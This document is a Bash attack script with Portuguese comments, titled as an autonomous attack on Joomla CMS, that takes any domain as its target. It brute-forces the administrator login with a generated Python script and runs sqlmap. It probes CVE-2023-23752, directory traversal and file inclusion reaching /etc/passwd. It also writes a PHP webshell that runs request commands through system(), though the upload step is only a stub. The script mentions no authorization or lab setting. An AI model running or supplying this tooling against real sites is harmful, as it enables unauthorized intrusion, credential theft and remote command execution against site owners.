#!/bin/bash

################################################################################
# SCRIPT DE ATAQUE AUTÔNOMO - Joomla CMS
# Descrição: Ataque agressivo contra Joomla CMS
################################################################################

# Solicitar target do usuário
if [ -z "$1" ]; then
    echo "Uso: $0 <DOMINIO>"
    echo "Exemplo: $0 exemplo.com.br"
    exit 1
fi

TARGET="$1"
URL="https://$TARGET"
LOG_DIR="./logs_joomla"
WORDLIST="/usr/share/wordlists/rockyou.txt"
RESULTS_FILE="$LOG_DIR/joomla_results.txt"

# Cores
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo -e "${GREEN}[+] Iniciando ataque autônomo contra Joomla${NC}"
echo -e "${GREEN}[+] Target: $URL${NC}"

mkdir -p $LOG_DIR

# Verificar e instalar ferramentas
check_and_install() {
    local tool=$1
    local install_cmd=$2
    
    if ! command -v $tool &> /dev/null; then
        echo -e "${YELLOW}[!] $tool não encontrado. Instalando...${NC}"
        eval $install_cmd
    fi
}

echo -e "${YELLOW}[*] Verificando ferramentas...${NC}"
check_and_install "wget" "sudo apt-get install -y wget"
check_and_install "curl" "sudo apt-get install -y curl"
check_and_install "python3" "sudo apt-get install -y python3 python3-pip"
check_and_install "joomscan" "sudo apt-get install -y joomscan || git clone https://github.com/OWASP/joomscan.git /opt/joomscan"
check_and_install "sqlmap" "sudo apt-get install -y sqlmap"
check_and_install "nikto" "sudo apt-get install -y nikto"

# Instalar ferramentas Python
pip3 install requests beautifulsoup4 lxml 2>/dev/null

# FASE 1: RECONHECIMENTO
echo -e "${YELLOW}[*] FASE 1: Reconhecimento Joomla${NC}"
echo "=================================="

# Verificar se é Joomla
echo -e "${YELLOW}[*] Verificando se é Joomla...${NC}"
curl -s "$URL" | grep -i "joomla\|administrator" > $LOG_DIR/joomla_check.txt
if [ -s "$LOG_DIR/joomla_check.txt" ]; then
    echo -e "${GREEN}[+] Joomla detectado${NC}"
else
    echo -e "${YELLOW}[!] Joomla não detectado claramente, continuando...${NC}"
fi

# Baixar robots.txt
echo -e "${YELLOW}[*] Baixando robots.txt...${NC}"
curl -s "$URL/robots.txt" > $LOG_DIR/robots.txt
cat $LOG_DIR/robots.txt

# Verificar diretório administrator
echo -e "${YELLOW}[*] Verificando /administrator...${NC}"
curl -s "$URL/administrator" > $LOG_DIR/administrator_page.html
if grep -q "login\|username\|password" $LOG_DIR/administrator_page.html; then
    echo -e "${GREEN}[+] Página de login do administrador encontrada${NC}"
fi

# Joomscan
if command -v joomscan &> /dev/null || [ -d "/opt/joomscan" ]; then
    echo -e "${YELLOW}[*] Executando Joomscan...${NC}"
    if [ -d "/opt/joomscan" ]; then
        cd /opt/joomscan && perl joomscan.pl -u $URL -o $LOG_DIR/joomscan_report.txt
    else
        joomscan -u $URL -o $LOG_DIR/joomscan_report.txt
    fi
fi

# Nikto
echo -e "${YELLOW}[*] Executando Nikto...${NC}"
nikto -h $URL -o $LOG_DIR/nikto_report.txt 2>&1

# FASE 2: ENUMERAÇÃO
echo -e "${YELLOW}[*] FASE 2: Enumeração${NC}"
echo "=================================="

# Enumerar versão do Joomla
echo -e "${YELLOW}[*] Tentando identificar versão...${NC}"
curl -s "$URL" | grep -oP 'Joomla! [0-9.]+' > $LOG_DIR/version.txt
curl -s "$URL/administrator/manifests/files/joomla.xml" > $LOG_DIR/joomla.xml 2>/dev/null
curl -s "$URL/language/en-GB/en-GB.xml" > $LOG_DIR/language.xml 2>/dev/null

# Enumerar usuários
echo -e "${YELLOW}[*] Enumerando usuários...${NC}"
python3 << EOF 2>&1 | tee $LOG_DIR/user_enum.txt
import requests
import sys

url = "$URL"
users = ["admin", "administrator", "root", "test", "user", "webmaster"]

for user in users:
    try:
        # Tentar acessar perfil público
        r = requests.get(f"{url}/index.php?option=com_users&view=profile", 
                        params={"username": user}, timeout=5)
        if r.status_code == 200 and user.lower() in r.text.lower():
            print(f"[+] Usuário encontrado: {user}")
    except:
        pass
EOF

# FASE 3: BRUTE FORCE ADMINISTRATOR
echo -e "${YELLOW}[*] FASE 3: Brute Force no Administrador${NC}"
echo "=================================="

# Criar wordlist de usuários
USERS=("admin" "administrator" "root" "user" "test" "webmaster")

# Criar wordlist de senhas se não existir
if [ ! -f "$WORDLIST" ]; then
    cat > /tmp/joomla_passwords.txt << EOF
admin
password
123456
admin123
root
toor
password123
admin@123
root@123
user123
test123
EOF
    WORDLIST="/tmp/joomla_passwords.txt"
fi

# Script Python para brute force
cat > /tmp/joomla_brute.py << 'PYEOF'
#!/usr/bin/env python3
import requests
import sys
from urllib.parse import urljoin

url = sys.argv[1]
users_file = sys.argv[2]
passwords_file = sys.argv[3]

login_url = urljoin(url, "/administrator/index.php")

with open(users_file, 'r') as f:
    users = [line.strip() for line in f if line.strip()]

with open(passwords_file, 'r') as f:
    passwords = [line.strip() for line in f if line.strip()]

session = requests.Session()

for user in users:
    for password in passwords:
        try:
            # Obter token CSRF
            r = session.get(login_url, timeout=5)
            if 'name="return"' not in r.text:
                continue
            
            # Extrair token
            import re
            token_match = re.search(r'name="([a-f0-9]{32})" value="1"', r.text)
            if not token_match:
                continue
            token = token_match.group(1)
            
            # Tentar login
            data = {
                'username': user,
                'passwd': password,
                'option': 'com_login',
                'task': 'login',
                'return': '',
                token: '1'
            }
            
            r = session.post(login_url, data=data, timeout=5, allow_redirects=False)
            
            if r.status_code == 303 or 'administrator' in r.url or 'logout' in r.text.lower():
                print(f"[+] SUCESSO! {user}:{password}")
                sys.exit(0)
        except Exception as e:
            pass

print("[-] Nenhuma credencial encontrada")
PYEOF

chmod +x /tmp/joomla_brute.py

echo -e "${YELLOW}[*] Executando brute force...${NC}"
printf '%s\n' "${USERS[@]}" > /tmp/joomla_users.txt
python3 /tmp/joomla_brute.py "$URL" /tmp/joomla_users.txt "$WORDLIST" 2>&1 | tee $LOG_DIR/brute_force.txt

# FASE 4: EXPLORAÇÃO DE VULNERABILIDADES
echo -e "${YELLOW}[*] FASE 4: Exploração de Vulnerabilidades${NC}"
echo "=================================="

# SQL Injection
echo -e "${YELLOW}[*] Testando SQL Injection...${NC}"
sqlmap -u "$URL/index.php?option=com_content&view=article&id=1" --batch --crawl=2 --level=3 --risk=2 -o $LOG_DIR/sqlmap_results.txt 2>&1

# Testar vulnerabilidades conhecidas
echo -e "${YELLOW}[*] Testando vulnerabilidades conhecidas...${NC}"

# CVE-2023-23752 - Information Disclosure
echo -e "${YELLOW}[*] Testando CVE-2023-23752...${NC}"
curl -s "$URL/api/index.php/v1/config/application?public=true" > $LOG_DIR/cve_2023_23752.txt
if [ -s "$LOG_DIR/cve_2023_23752.txt" ] && grep -q "password\|database" $LOG_DIR/cve_2023_23752.txt; then
    echo -e "${GREEN}[+] CVE-2023-23752 pode estar presente!${NC}" | tee -a $RESULTS_FILE
fi

# Directory Traversal
echo -e "${YELLOW}[*] Testando Directory Traversal...${NC}"
for path in "../../../etc/passwd" "....//....//etc/passwd" "..%2F..%2F..%2Fetc%2Fpasswd"; do
    curl -s "$URL/index.php?option=com_content&view=article&id=$path" > $LOG_DIR/traversal_$(echo $path | tr '/' '_').txt
done

# File Inclusion
echo -e "${YELLOW}[*] Testando File Inclusion...${NC}"
curl -s "$URL/index.php?option=../../../etc/passwd" > $LOG_DIR/lfi_test.txt

# FASE 5: UPLOAD DE WEBSHELL
echo -e "${YELLOW}[*] FASE 5: Tentativa de Upload de Webshell${NC}"
echo "=================================="

# Criar webshell
cat > /tmp/joomla_shell.php << 'PHPEOF'
<?php
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
if(isset($_POST['cmd'])) {
    system($_POST['cmd']);
}
phpinfo();
?>
PHPEOF

# Tentar upload via diferentes métodos
echo -e "${YELLOW}[*] Tentando fazer upload...${NC}"

# Se tivermos credenciais, tentar fazer upload
if grep -q "SUCESSO" $LOG_DIR/brute_force.txt; then
    echo -e "${GREEN}[+] Credenciais encontradas, tentando fazer upload...${NC}"
    # Aqui você poderia usar as credenciais para fazer login e upload
fi

# FASE 6: PÓS-EXPLORAÇÃO
echo -e "${YELLOW}[*] FASE 6: Pós-Exploração${NC}"
echo "=================================="

# Se webshell foi enviado, testar
if [ -f "$LOG_DIR/webshell_uploaded.txt" ]; then
    echo -e "${GREEN}[+] Webshell disponível, testando...${NC}"
    curl -s "$URL/shell.php?cmd=id" > $LOG_DIR/webshell_test.txt
    curl -s "$URL/shell.php?cmd=whoami" >> $LOG_DIR/webshell_test.txt
    curl -s "$URL/shell.php?cmd=uname -a" >> $LOG_DIR/webshell_test.txt
fi

# RESUMO
echo ""
echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}[+] ATAQUE JOOMLA CONCLUÍDO${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "${YELLOW}[*] Logs salvos em: $LOG_DIR${NC}"
echo -e "${YELLOW}[*] Resultados em: $RESULTS_FILE${NC}"
echo ""
ls -lah $LOG_DIR/

